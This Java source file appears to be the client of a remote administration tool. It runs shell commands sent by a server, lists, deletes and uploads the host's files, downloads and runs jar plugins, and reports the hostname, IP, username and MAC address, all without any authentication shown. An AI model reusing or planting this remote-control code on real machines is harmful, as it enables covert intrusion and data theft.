package client.communication;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.LinkedList;
import plugin.client.ClientPlugin;
import client.miscelaneous.ZipUtility;
import client.platformdependant.PlatformDependant;

public class MessageProcessor {

    private static float clientVersion = 1;

    private static final String UNKNOWN_QUERY = "unknown";

    private static final String detailDelimeter = "" + (char) 31;

    private static String currentDirectory = "/";

    private static String noSuchFile = "No such file or directory";

    public static volatile PrintWriter out;

    public static volatile BufferedReader in;

    public static volatile Socket servSocket;

    private static String bigDelimeter = "" + (char) 30;

    private static final String pluginDir = "ClientPlugins";

    private static LinkedList<ClientPlugin> clientPlugins = new LinkedList<ClientPlugin>();

    private static boolean pluginsRunning = false;

    public String process(String s) {
        String[] args = s.split(":");
        if (args[0].equals("query")) return processQuery(args[1]);
        if (args[0].equals("exec")) return executeCommand(s.substring(5));
        if (args[0].equals("getplugin")) return startWritingPlugin(args[1]);
        if (args[0].equals("p")) return writePluginPart(args[1]);
        if (args[0].equals("bash")) return executeBash(s.substring(5));
        if (s.equals("plugins:ok")) return runPlugins();
        return pluginCommand(s);
    }

    private String pluginCommand(String com) {
        if (clientPlugins != null) {
            for (ClientPlugin cp : clientPlugins) if (cp.triggeredByCommand(com)) {
                cp.setServerSocket(servSocket);
                return cp.trigger(com);
            }
        }
        return UNKNOWN_QUERY;
    }

    private static FileOutputStream currentPlugin = null;

    private String writePluginPart(String part) {
        try {
            currentPlugin.write(Integer.parseInt(part));
        } catch (Exception e) {
            System.err.println("Unable to write plugin part");
        }
        return null;
    }

    private String executeBash(String command) {
        try {
            Runtime.getRuntime().exec(command).waitFor();
        } catch (Exception e) {
            return "bash:fail";
        }
        return "bash:success";
    }

    private String startWritingPlugin(String filename) {
        if (filename.equals("finished")) {
            try {
                currentPlugin.close();
            } catch (Exception e) {
                System.err.println("Failed closing the plugin file");
            }
            System.out.println("Plugin downloading finished");
        } else {
            System.out.println("Downloading " + filename);
            try {
                File f = new File(PlatformDependant.getInstance().getHomeDirectory() + "/" + pluginDir);
                if (!f.exists()) f.mkdir();
                currentPlugin = new FileOutputStream(PlatformDependant.getInstance().getHomeDirectory() + "/" + pluginDir + "/" + filename);
            } catch (Exception e) {
                System.err.println("Unable to write to a file");
                e.printStackTrace();
                System.exit(-1);
            }
        }
        return null;
    }

    public static String runPlugins() {
        File plugDir = new File(PlatformDependant.getInstance().getHomeDirectory() + "/" + pluginDir);
        if (!plugDir.exists()) {
            plugDir.mkdir();
            return null;
        }
        System.out.println("Starting ClientPlugins");
        File[] plugins = plugDir.listFiles(new FilenameFilter() {

            public boolean accept(File f, String name) {
                if (name.endsWith(".jar")) return true;
                return false;
            }
        });
        System.out.println("Loaded " + plugins.length + " plugin(s)");
        URLClassLoader cLoader;
        URL[] urls = new URL[1];
        ClientPlugin plugInstance;
        for (int i = 0; i < plugins.length; i++) {
            try {
                urls[0] = plugins[i].toURL();
            } catch (Exception e) {
                e.printStackTrace();
            }
            cLoader = new URLClassLoader(urls);
            plugInstance = getPluginInstance("plugin.client.Main", cLoader);
            clientPlugins.add(plugInstance);
            plugInstance.setJarFileName(plugins[i].getName());
            if (!plugInstance.triggeredByCommand()) plugInstance.trigger();
        }
        return null;
    }

    private String executeCommand(String command) {
        String answer = "done:";
        if (command.equals("ls")) {
            File dir = new File(currentDirectory);
            File[] l = dir.listFiles();
            boolean first = true;
            for (File f : l) {
                if (first) first = false; else answer += detailDelimeter;
                answer += (f.isFile() ? "f - " : "d - ") + f.getName();
            }
            return answer;
        } else if (command.equals("drives")) {
            File[] drives = File.listRoots();
            boolean first = true;
            for (File f : drives) {
                if (first) first = false; else answer += detailDelimeter;
                answer += f.getPath();
            }
            return answer;
        } else if (command.startsWith("cd ")) {
            if (command.length() < 4) return answer + noSuchFile;
            String subcom = command.substring(3);
            if (subcom.equals("/") || (subcom.charAt(1) == ':')) {
                currentDirectory = "/";
                return answer + currentDirectory;
            } else if (subcom.equals("..")) {
                if (currentDirectory.endsWith("/") || currentDirectory.endsWith("\\")) currentDirectory = currentDirectory.substring(0, currentDirectory.length() - 1);
                int i = currentDirectory.lastIndexOf('/'), j = currentDirectory.lastIndexOf('\\');
                if (i < j) i = j;
                currentDirectory = currentDirectory.substring(0, i);
                if (currentDirectory.equals("")) currentDirectory = "/";
                return answer + currentDirectory;
            } else if (subcom.startsWith("/")) {
                File f = new File(subcom);
                if (!f.exists()) return answer + noSuchFile;
                if (!f.isDirectory()) return answer + "Unable to change directory to a file";
                currentDirectory = subcom;
                return answer + currentDirectory;
            } else {
                if (currentDirectory.endsWith("/") || currentDirectory.endsWith("\\")) currentDirectory = currentDirectory.substring(0, currentDirectory.length() - 1);
                String path = currentDirectory + '/' + subcom;
                File f = new File(path);
                if (!f.exists()) return answer + noSuchFile;
                if (!f.isDirectory()) return answer + "Unable to change directory to a file";
                currentDirectory = path;
                return answer + currentDirectory;
            }
        } else if (command.startsWith("cdd ")) {
            if (command.length() != 5) return answer + "Incorrect cdd syntax";
            String path = command.substring(4) + ":/";
            File f = new File(path);
            if (f.exists()) {
                currentDirectory = path;
                return answer + path;
            } else return answer + "No such drive";
        } else if (command.startsWith("rm ")) {
            if (command.length() < 4) return answer + "Incorrect rm syntax";
            if (currentDirectory.endsWith("/") || currentDirectory.endsWith("\\")) currentDirectory = currentDirectory.substring(0, currentDirectory.length() - 1);
            if (currentDirectory.equals("")) currentDirectory = "/";
            String del = command.substring(3);
            File f = currentDirectory.equals("/") ? new File(currentDirectory + del) : new File(currentDirectory + "/" + del);
            if (f.exists()) {
                if (f.delete()) return answer + del + " has been successfully deleted";
                return answer + "Unable to delete " + del + ". File might be used by some other program, or you don't have sufficient rights to perform the operation";
            } else return answer + "The file does not exist";
        } else if (command.equals("path")) return answer + currentDirectory; else if (command.startsWith("download ")) {
            if (command.length() < 10) return answer + noSuchFile;
            if (currentDirectory.endsWith("/") || currentDirectory.endsWith("\\")) currentDirectory = currentDirectory.substring(0, currentDirectory.length() - 1);
            if (currentDirectory.equals("")) currentDirectory = "/";
            String filename = command.substring(9);
            File f;
            if (currentDirectory.equals("/")) f = new File(currentDirectory + filename); else f = new File(currentDirectory + "/" + filename);
            if (!f.exists()) return answer + noSuchFile;
            sendFile(f);
            return "file:finished";
        }
        return answer + UNKNOWN_QUERY;
    }

    private void sendFile(File file) {
        try {
            if (file.isFile()) {
                FileInputStream fReader = null;
                try {
                    fReader = new FileInputStream(file.getAbsolutePath());
                } catch (Exception e) {
                    e.printStackTrace();
                    return;
                }
                int c;
                out.println("file:" + file.getName());
                while ((c = fReader.read()) != -1) {
                    out.println(c);
                }
                fReader.close();
            } else {
                File temp = new File(file.getName() + ".zip");
                ZipUtility.zipDirectory(file, temp);
                sendFile(temp);
                temp.delete();
            }
        } catch (Exception e) {
            System.err.println("Error while sending a file: " + e);
            e.printStackTrace();
        }
        System.out.println("finished sending");
    }

    private String getPluginInfoMessage(File plugDir) {
        System.out.println("Loading ClientPlugins");
        File[] plugins = plugDir.listFiles(new FilenameFilter() {

            public boolean accept(File f, String name) {
                if (name.endsWith(".jar")) return true;
                return false;
            }
        });
        System.out.println("Loaded " + plugins.length + " plugin(s)");
        URLClassLoader cLoader;
        URL[] urls = new URL[1];
        ClientPlugin plugInstance;
        String message = plugins.length > 0 ? ":" : "";
        boolean first = true;
        for (int i = 0; i < plugins.length; i++) {
            try {
                urls[0] = plugins[i].toURL();
            } catch (Exception e) {
                e.printStackTrace();
            }
            cLoader = new URLClassLoader(urls);
            plugInstance = getPluginInstance("plugin.client.Main", cLoader);
            if (first) first = false; else message += detailDelimeter;
            message += plugInstance.getName() + "_" + plugInstance.getVersion();
        }
        return message;
    }

    private static ClientPlugin getPluginInstance(String className, ClassLoader cLoader) {
        try {
            return (ClientPlugin) Class.forName(className, true, cLoader).newInstance();
        } catch (Exception e) {
            System.err.println("Error occured when genereting instance of a plugin: " + e);
            return null;
        }
    }

    private String processQuery(String s) {
        if (s.equals("os")) {
            String answer;
            try {
                answer = "os:" + System.getProperty("os.name") + detailDelimeter + System.getProperty("os.version") + detailDelimeter + System.getProperty("os.arch") + detailDelimeter + InetAddress.getLocalHost().getHostName() + detailDelimeter + InetAddress.getLocalHost().getHostAddress() + detailDelimeter + clientVersion + detailDelimeter + System.getProperty("user.name") + detailDelimeter + getMyMacAddress();
            } catch (Exception e) {
                answer = "os:" + System.getProperty("os.name") + detailDelimeter + System.getProperty("os.version") + detailDelimeter + System.getProperty("os.arch") + detailDelimeter + "unknown" + detailDelimeter + "unknown" + detailDelimeter + clientVersion + detailDelimeter + System.getProperty("user.name") + detailDelimeter + getMyMacAddress();
            }
            File plugDir = new File(PlatformDependant.getInstance().getHomeDirectory() + "/" + pluginDir);
            if (!plugDir.exists() || !plugDir.isDirectory()) return answer;
            answer += getPluginInfoMessage(plugDir);
            return answer;
        }
        if (s.equals("clienttype")) return "clienttype:user";
        if (s.equals("ping")) return "ping:yup";
        return UNKNOWN_QUERY;
    }

    private String getMyMacAddress() {
        try {
            InetAddress ip = InetAddress.getLocalHost();
            NetworkInterface network = NetworkInterface.getByInetAddress(ip);
            byte[] mac = network.getHardwareAddress();
            System.out.print("Current MAC address : ");
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < mac.length; i++) sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
            return sb.toString();
        } catch (Exception e) {
            return null;
        }
    }
}
